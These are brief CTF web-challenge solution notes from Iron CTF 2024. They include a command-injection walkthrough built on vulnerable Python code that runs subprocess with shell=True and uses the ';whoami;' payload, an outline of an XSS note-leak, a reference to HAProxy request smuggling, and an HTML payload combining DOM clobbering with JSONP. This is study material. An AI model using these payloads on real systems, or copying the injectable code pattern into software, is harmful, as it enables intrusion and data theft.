
Author writeups: https://abdulhaq.me/blog/iron-ctf-2024/#web-secret-notes


# JWT hunt:
Different parts of jet token secret key in :
/robots.txt
/sitemap.xml
in cookies
Send HEAD request to /secretkeypart4 and key is in the headers.

# b64site viewer:

Everything in discord question.

# cerealShop:
php objection injection. Everything in discord question.

# moviereviewapp:
git dump the application. Go through the commits to find about  the servermonitor/admin directory which had a hidden admin login page. The creds can be seen hardcoded while going through other commits.
Logging into the admin panel we see a page which can be used to ping an ip address.
Going through the source code of the ping app through the git logs we see this:

```
def ping_ip(ip, count):
    if re.match(r'^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$', ip):
        return subprocess.check_output(f"ping -c {count} {ip}", shell=True).decode()
    else:
        return "Invalid ip address and count!"
```

The count parameter has no validation so we can inject arbitrary commands.
So finally:
Exploit Scenario:
1. Login to the admin panel using the credntials.
2. Supply a valid IP in the IP address and intercept the request. Change the count to value as:
;whoami;

Final payload on Server side will work like:
ping -c ;whoami; x.x.x.x.

# Loan App:
Had to exploit the http smuggling vulnerability in the haproxy version being used:
https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/

# Secret Notes:
The main concept of this chall is reflected XSS via HTML injection in alt={name} and leak memo with it.
Set Cookie as session={session};path=/profile; The priority of cookie is sort by path, and when admin bot logins, It will redirect to /profile page,
and then XSS trriggers and leak notes to webhook.

# Beautiful Buttons:

# HTML personality analyser:


# Hiring platform:

The intended approach was to manipulate the DOM by using:

```html
<form id="PRODUCTION"></form>
```

Then, an input element was added with the `form` attribute:

```html
<input type="text" name="remark" value="SELECT NOW!!" form="select_humans">
```

This approach leverages the `form` attribute, allowing the input's value to be submitted with the form specified by the form ID (`select_humans`) elsewhere on the page. Additionally, a JSONP endpoint in WordPress was used to trigger a button click.

```html
<form id="PRODUCTION">
    <input type="text" name="remark" value="SELECT NOW!!" form="select_humans">
</form>
<iframe srcdoc="<script src='/blog/wp-json/wp/v2/users/1?_jsonp=window.parent.document.body.firstElementChild.nextElementSibling.nextElementSibling.firstElementChild.submit'></script>"></iframe>
```
